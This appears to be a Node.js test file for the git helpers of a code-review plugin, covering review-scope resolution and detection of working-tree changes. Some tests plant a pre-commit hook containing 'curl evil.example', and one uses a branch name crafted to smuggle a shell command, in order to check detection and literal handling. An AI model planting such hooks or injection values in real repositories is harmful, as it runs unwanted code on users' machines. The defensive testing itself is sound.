import fs from "node:fs";
import path from "node:path";
import test from "node:test";
import assert from "node:assert/strict";

import {
  collectReviewContext,
  diffWorkingTreeFingerprints,
  fingerprintWorkingTree,
  resolveReviewTarget
} from "../plugins/grok/scripts/lib/git.mjs";
import { initGitRepo, makeTempDir, run } from "./helpers.mjs";

test("resolveReviewTarget prefers working tree when repo is dirty", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v2');\n");

  const target = resolveReviewTarget(cwd, {});

  assert.equal(target.mode, "working-tree");
});

test("resolveReviewTarget falls back to branch diff when repo is clean", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  run("git", ["checkout", "-b", "feature/test"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v2');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "change"], { cwd });

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(target.mode, "branch");
  assert.match(target.label, /main/);
  assert.match(context.content, /Branch Diff/);
});

test("default branch names with special characters are passed to git literally", () => {
  const cwd = makeTempDir();
  const branchName = "main&branch-helper&x";
  const helperOutputPath = path.join(cwd, "branch-helper-output");
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "branch-helper.cmd"), "@echo branch-helper>branch-helper-output\r\n");
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('base');\n");
  run("git", ["add", "app.js", "branch-helper.cmd"], { cwd });
  run("git", ["commit", "-m", "base"], { cwd });
  run("git", ["branch", "-m", branchName], { cwd, shell: false });
  run("git", ["update-ref", `refs/remotes/origin/${branchName}`, branchName], { cwd, shell: false });
  run("git", ["symbolic-ref", "refs/remotes/origin/HEAD", `refs/remotes/origin/${branchName}`], {
    cwd,
    shell: false
  });
  run("git", ["checkout", "-b", "feature/test"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('feature');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "feature"], { cwd });

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(target.mode, "branch");
  assert.equal(target.baseRef, `origin/${branchName}`);
  assert.match(context.content, /Branch Diff/);
  assert.equal(fs.existsSync(helperOutputPath), false);
});

test("resolveReviewTarget honors explicit base overrides", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  run("git", ["checkout", "-b", "feature/test"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v2');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "change"], { cwd });

  const target = resolveReviewTarget(cwd, { base: "main" });

  assert.equal(target.mode, "branch");
  assert.equal(target.baseRef, "main");
});

test("resolveReviewTarget requires an explicit base when no default branch can be inferred", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  run("git", ["branch", "-m", "feature-only"], { cwd });

  assert.throws(
    () => resolveReviewTarget(cwd, {}),
    /Unable to detect the repository default branch\. Pass --base <ref> or use --scope working-tree\./
  );
});

test("collectReviewContext keeps inline diffs for tiny adversarial reviews", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('INLINE_MARKER');\n");

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(context.inputMode, "inline-diff");
  assert.equal(context.fileCount, 1);
  assert.match(context.collectionGuidance, /primary evidence/i);
  assert.match(context.content, /INLINE_MARKER/);
  assert.equal(context.inlinedEverything, true, "the prompt carries the whole change");
});

test("collectReviewContext skips untracked directories in working tree review", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });

  const nestedRepoDir = path.join(cwd, ".claude", "worktrees", "agent-test");
  fs.mkdirSync(nestedRepoDir, { recursive: true });
  initGitRepo(nestedRepoDir);

  const target = resolveReviewTarget(cwd, { scope: "working-tree" });
  const context = collectReviewContext(cwd, target);

  assert.match(context.content, /### \.claude\/worktrees\/agent-test\/\n\(skipped: directory\)/);
});

test("collectReviewContext skips broken untracked symlinks instead of crashing", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "console.log('v1');\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.symlinkSync("missing-target", path.join(cwd, "broken-link"));

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(target.mode, "working-tree");
  assert.match(context.content, /### broken-link/);
  assert.match(context.content, /skipped: broken symlink or unreadable file/i);
});

test("collectReviewContext falls back to lightweight context for larger adversarial reviews", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  for (const name of ["a.js", "b.js", "c.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v1";\n`);
  }
  run("git", ["add", "a.js", "b.js", "c.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "a.js"), 'export const value = "SELF_COLLECT_MARKER_A";\n');
  fs.writeFileSync(path.join(cwd, "b.js"), 'export const value = "SELF_COLLECT_MARKER_B";\n');
  fs.writeFileSync(path.join(cwd, "c.js"), 'export const value = "SELF_COLLECT_MARKER_C";\n');

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(context.inputMode, "self-collect");
  assert.equal(context.fileCount, 3);
  assert.match(context.collectionGuidance, /lightweight summary/i);
  assert.match(context.collectionGuidance, /read-only git commands/i);
  assert.doesNotMatch(context.content, /SELF_COLLECT_MARKER_[ABC]/);
  assert.match(context.content, /## Changed Files/);
  assert.equal(context.inlinedEverything, false, "grok has to go and read the diff");
});

test("collectReviewContext falls back to lightweight context for oversized single-file diffs", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "export const value = 'v1';\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), `export const value = '${"x".repeat(512)}';\n`);

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target, { maxInlineDiffBytes: 128 });

  assert.equal(context.fileCount, 1);
  assert.equal(context.inputMode, "self-collect");
  assert.ok(context.diffBytes > 128);
  assert.doesNotMatch(context.content, /xxx/);
  assert.match(context.content, /## Changed Files/);
});

test("collectReviewContext keeps untracked file content in lightweight working tree context", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  for (const name of ["a.js", "b.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v1";\n`);
  }
  run("git", ["add", "a.js", "b.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "a.js"), 'export const value = "TRACKED_MARKER_A";\n');
  fs.writeFileSync(path.join(cwd, "b.js"), 'export const value = "TRACKED_MARKER_B";\n');
  fs.writeFileSync(path.join(cwd, "new-risk.js"), 'export const value = "UNTRACKED_RISK_MARKER";\n');

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(context.inputMode, "self-collect");
  assert.equal(context.fileCount, 3);
  assert.doesNotMatch(context.content, /TRACKED_MARKER_[AB]/);
  assert.match(context.content, /## Untracked Files/);
  assert.match(context.content, /UNTRACKED_RISK_MARKER/);
});

/**
 * Lightweight context has always carried untracked file contents, since they
 * are in no diff — but with no ceiling. A tree with dozens of untracked files
 * (runtime workspaces, generated reports) put several hundred kilobytes into
 * every review prompt. Past the budget, files are listed by size for Grok to
 * read with its tools.
 */
test("collectReviewContext bounds the untracked content it inlines in lightweight mode", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  for (const name of ["a.js", "b.js", "c.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v1";\n`);
  }
  run("git", ["add", "a.js", "b.js", "c.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  for (const name of ["a.js", "b.js", "c.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v2";\n`);
  }
  for (let index = 0; index < 6; index += 1) {
    fs.writeFileSync(path.join(cwd, `gen-${index}.txt`), `UNTRACKED_MARKER_${index}\n${"x".repeat(2000)}\n`);
  }

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target, { maxUntrackedInlineBytes: 5000 });

  assert.equal(context.inputMode, "self-collect");
  assert.match(context.content, /UNTRACKED_MARKER_0/);
  assert.match(context.content, /UNTRACKED_MARKER_1/);
  assert.doesNotMatch(context.content, /UNTRACKED_MARKER_[2-5]/, "files past the budget must not be inlined");
  assert.match(context.content, /### gen-2\.txt\n\(\d+ bytes; not inlined/);
  assert.match(context.content, /2 of 6 untracked text file\(s\) are inlined/);
  assert.match(context.collectionGuidance, /read it with your file tools/);
  assert.ok(Buffer.byteLength(context.content, "utf8") < 8000, "the prompt must stay close to the budget");
  assert.equal(context.inlinedEverything, false);
});

test("fingerprintWorkingTree catches new files and further edits to already-modified files", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v2';\n");

  const before = fingerprintWorkingTree(cwd);
  assert.equal(before.incomplete, null);
  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)), { changed: [], unverified: null }, "an idle tree must not trip");

  fs.writeFileSync(path.join(cwd, "leaked.txt"), "x\n");
  // Already modified, so the status code does not move — and this edit keeps
  // the size and line counts too, so only the content hash gives it away.
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v3';\n");

  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["a.js", "leaked.txt"]);
});

/**
 * A partial snapshot is not proof of an unchanged tree. If any step of the
 * fingerprint fails, the comparison has to say the tree is unverified rather
 * than report nothing changed.
 */
test("diffWorkingTreeFingerprints reports an incomplete snapshot as unverified", () => {
  const complete = { entries: new Map([["a.js", " M abc"], ["b.js", " M def"]]), incomplete: null };
  const partial = { entries: new Map([["a.js", " M"], ["b.js", "M "], ["new.txt", "?? 3@1"]]), incomplete: "git hash-object failed: boom" };

  const result = diffWorkingTreeFingerprints(complete, partial);
  assert.equal(result.unverified, "git hash-object failed: boom");
  assert.deepEqual(
    result.changed,
    ["b.js", "new.txt"],
    "only the status codes are comparable, so the missing hash on a.js is not an edit while a re-staged file and a new one still show"
  );
});

/** A write through an untracked symlink lands on the target; stat follows it. */
test("fingerprintWorkingTree sees a write through an untracked symlink", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  const outside = path.join(makeTempDir(), "outside.txt");
  fs.writeFileSync(outside, "before\n");
  fs.symlinkSync(outside, path.join(cwd, "link.txt"));

  const before = fingerprintWorkingTree(cwd);
  fs.writeFileSync(outside, "after: rewritten through the link\n");

  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["link.txt"]);
});

/**
 * In a linked worktree `--git-dir` is the per-worktree administrative
 * directory; hooks and the shared config live in the common directory. A hook
 * planted there runs on the user's next commit from any worktree.
 */
test("fingerprintWorkingTree catches a hook planted in the common git directory of a linked worktree", () => {
  const main = makeTempDir();
  initGitRepo(main);
  fs.writeFileSync(path.join(main, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd: main });
  run("git", ["commit", "-m", "init"], { cwd: main });
  const linked = path.join(makeTempDir(), "linked");
  const added = run("git", ["worktree", "add", "-b", "linked", linked], { cwd: main });
  assert.equal(added.status, 0, added.stderr);

  const before = fingerprintWorkingTree(linked);
  fs.mkdirSync(path.join(main, ".git", "hooks"), { recursive: true });
  fs.writeFileSync(path.join(main, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example\n");

  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(linked)).changed, [".git/hooks/pre-commit"]);
});

test("fingerprintWorkingTree catches a hook planted inside .git", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });

  const before = fingerprintWorkingTree(cwd);
  fs.mkdirSync(path.join(cwd, ".git", "hooks"), { recursive: true });
  fs.writeFileSync(path.join(cwd, ".git", "hooks", "pre-commit"), "#!/bin/sh\ncurl evil.example\n");

  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, [".git/hooks/pre-commit"]);
});

test("fingerprintWorkingTree catches a commit that leaves the tree looking untouched", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v2';\n");

  const before = fingerprintWorkingTree(cwd);
  run("git", ["commit", "-am", "committed by the review"], { cwd });

  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["HEAD", "a.js"]);
});

test("fingerprintWorkingTree works before the first commit", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  const before = fingerprintWorkingTree(cwd);
  fs.writeFileSync(path.join(cwd, "x.txt"), "x\n");
  assert.deepEqual(diffWorkingTreeFingerprints(before, fingerprintWorkingTree(cwd)).changed, ["x.txt"]);
});

/**
 * A binary, a nested repository, or an unreadable path is not in the prompt
 * but is still part of the change, so an answer given without a tool call
 * cannot have looked at it.
 */
test("collectReviewContext treats a skipped untracked entry as needing inspection", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "a.js"), "export const value = 'v1';\n");
  run("git", ["add", "a.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "blob.bin"), Buffer.from([0, 1, 2, 3, 0, 255, 254, 0, 0, 0]));

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(context.inputMode, "inline-diff");
  assert.match(context.content, /blob\.bin\n\(skipped: binary file\)/);
  assert.equal(context.inlinedEverything, false, "the prompt does not carry the binary, so grok has to look");
});

/**
 * The wrong-scope failure, reproduced.
 *
 * `refs/remotes/origin/HEAD` names the default branch, but on a feature branch
 * nobody ever checks that branch out, so the local copy goes stale while
 * `origin/<name>` tracks reality. Once the branch merges the real base in,
 * diffing from the stale local copy replays every upstream commit as part of
 * the change — which is how an 8-file review became 113 files of unrelated
 * trunk work: cloud CLI, object store, and CI churn the branch never touched.
 */
test("branch review skips upstream work the branch merely merged in", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "base.js"), "export const base = 1;\n");
  run("git", ["add", "base.js"], { cwd });
  run("git", ["commit", "-m", "base"], { cwd });
  const baseCommit = run("git", ["rev-parse", "HEAD"], { cwd }).stdout.trim();

  // The local `main` never moves again; `origin/main` is what advances.
  run("git", ["update-ref", "refs/remotes/origin/main", baseCommit], { cwd });
  run("git", ["symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"], { cwd });

  // Upstream lands work this branch has nothing to do with.
  run("git", ["checkout", "-b", "upstream-sim"], { cwd });
  fs.writeFileSync(path.join(cwd, "object-store.js"), "export const store = 'upstream';\n");
  run("git", ["add", "object-store.js"], { cwd });
  run("git", ["commit", "-m", "upstream: object store"], { cwd });
  const upstreamCommit = run("git", ["rev-parse", "HEAD"], { cwd }).stdout.trim();
  run("git", ["update-ref", "refs/remotes/origin/main", upstreamCommit], { cwd });
  run("git", ["checkout", "main"], { cwd });
  run("git", ["branch", "-D", "upstream-sim"], { cwd });

  // The branch does its own work, then merges the current base in.
  run("git", ["checkout", "-b", "feature/scoped"], { cwd });
  fs.writeFileSync(path.join(cwd, "feature.js"), "export const feature = 1;\n");
  run("git", ["add", "feature.js"], { cwd });
  run("git", ["commit", "-m", "feature work"], { cwd });
  run("git", ["merge", "--no-edit", "origin/main"], { cwd });

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(target.baseRef, "origin/main", "the stale local branch must not be the review base");
  assert.deepEqual(context.changedFiles, ["feature.js"]);
  assert.ok(
    !context.changedFiles.includes("object-store.js"),
    "upstream work merged into the branch is not part of the change under review"
  );
});

test("an explicit base is honored even when a fresher ref exists", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "base.js"), "export const base = 1;\n");
  run("git", ["add", "base.js"], { cwd });
  run("git", ["commit", "-m", "base"], { cwd });
  run("git", ["update-ref", "refs/remotes/origin/main", "HEAD"], { cwd });
  run("git", ["checkout", "-b", "feature/explicit"], { cwd });
  fs.writeFileSync(path.join(cwd, "feature.js"), "export const feature = 1;\n");
  run("git", ["add", "feature.js"], { cwd });
  run("git", ["commit", "-m", "feature"], { cwd });

  const target = resolveReviewTarget(cwd, { base: "main" });

  assert.equal(target.baseRef, "main", "an explicit --base must be used verbatim");
});

/**
 * Naming the base branch and leaving the command to the model is what let the
 * reviewer reach for `git diff <base>` or the diff of a merge commit. The range
 * is known here, so the prompt has to state it.
 */
test("collection guidance pins the exact review range and file list", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  for (const name of ["a.js", "b.js", "c.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v1";\n`);
  }
  run("git", ["add", "."], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  run("git", ["checkout", "-b", "feature/guidance"], { cwd });
  for (const name of ["a.js", "b.js", "c.js"]) {
    fs.writeFileSync(path.join(cwd, name), `export const value = "${name}-v2";\n`);
  }
  run("git", ["add", "."], { cwd });
  run("git", ["commit", "-m", "change"], { cwd });

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);
  const mergeBase = run("git", ["merge-base", "HEAD", target.baseRef], { cwd }).stdout.trim();

  assert.equal(context.inputMode, "self-collect");
  assert.match(context.collectionGuidance, new RegExp(`git diff ${mergeBase}\\.\\.HEAD`));
  assert.match(context.collectionGuidance, /In scope \(3 file\(s\)\): a\.js, b\.js, c\.js/);
  assert.match(context.collectionGuidance, /outside that list is out of scope/i);
  assert.match(context.collectionGuidance, /git show HEAD/, "the wrong commands must be named explicitly");
});

test("working tree guidance pins scope to uncommitted work", () => {
  const cwd = makeTempDir();
  initGitRepo(cwd);
  fs.writeFileSync(path.join(cwd, "app.js"), "export const value = 1;\n");
  run("git", ["add", "app.js"], { cwd });
  run("git", ["commit", "-m", "init"], { cwd });
  fs.writeFileSync(path.join(cwd, "app.js"), "export const value = 2;\n");

  const target = resolveReviewTarget(cwd, {});
  const context = collectReviewContext(cwd, target);

  assert.equal(target.mode, "working-tree");
  assert.match(context.collectionGuidance, /uncommitted working tree/i);
  assert.match(context.collectionGuidance, /In scope \(1 file\(s\)\): app\.js/);
});
